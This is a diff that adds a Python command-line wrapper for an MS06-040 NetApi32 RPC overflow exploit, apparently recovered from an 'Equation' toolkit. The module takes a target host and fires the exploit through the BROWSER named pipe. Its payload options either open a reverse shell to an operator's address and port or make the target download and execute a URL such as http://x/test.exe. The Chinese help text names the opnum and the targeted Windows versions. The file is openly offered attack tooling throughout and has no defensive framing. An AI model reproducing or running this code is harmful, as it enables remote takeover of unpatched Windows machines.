@@ -1,0 +1,60 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+ms06040rpc_unpacked — MS06-040 unpacked binary exploit.
+
+Python rewrite of `ms06040rpc_unpacked.exe` recovered from
+`1ms06040rpc_Modified/ms06040rpc_unpacked.exe` in the
+方程式工具包图形界面版 v0.68 toolkit.
+
+This is the unpacked variant of the Mika MS06-040 exploit.  It reuses the
+recovered exploit engine from `nsa_equation.ms06040rpc.netapi32_exp`.
+"""
+
+from ..ms06040rpc import netapi32_exp
+
+
+def ms06040rpc_unpacked_handle(args):
+    """Run the MS06-040 unpacked exploit against the supplied host."""
+    return netapi32_exp.run_function(
+        host=args.host,
+        mode="reverse" if args.rport is not None else "download",
+        url=args.url,
+        raddr=args.raddr,
+        rport=args.rport,
+        os_type=args.ostype,
+    )
+
+
+def reg_subparser(subparsers):
+    """Register the `ms06040rpc_unpacked` subcommand on an argparse subparsers group."""
+    p = subparsers.add_parser(
+        "ms06040rpc_unpacked",
+        help="MS06-040 unpacked-binary RPC 利用 (unpacked variant)",
+        description="MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用工具，"
+                    "unpacked 变体。通过远程 \\\\<host>\\pipe\\BROWSER 命名管道"
+                    "绑定 Browser RPC 接口，发送 NetpwPathCanonicalize 溢出请求 "
+                    "(opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 "
+                    "(download) 的 shellcode，针对 Win2000 SP4 / WinXP SP1。",
+    )
+    p.add_argument(
+        "host", metavar="HOST",
+        help="目标主机名或 IP",
+    )
+    p.add_argument(
+        "-u", "--url", metavar="URL",
+        help="download 模式：让目标去下载并执行的 URL，如 http://x/test.exe",
+    )
+    p.add_argument(
+        "-r", "--raddr", metavar="ADDR",
+        help="reverse 模式：反弹连接的目标（本机）IP",
+    )
+    p.add_argument(
+        "-p", "--rport", type=int, metavar="PORT",
+        help="reverse 模式：反弹连接的监听端口",
+    )
+    p.add_argument(
+        "-o", "--ostype", type=int, default=1,
+        help="目标系统：1=Win2000 SP4（默认），2=WinXP SP1",
+    )
+    p.set_defaults(func=ms06040rpc_unpacked_handle)
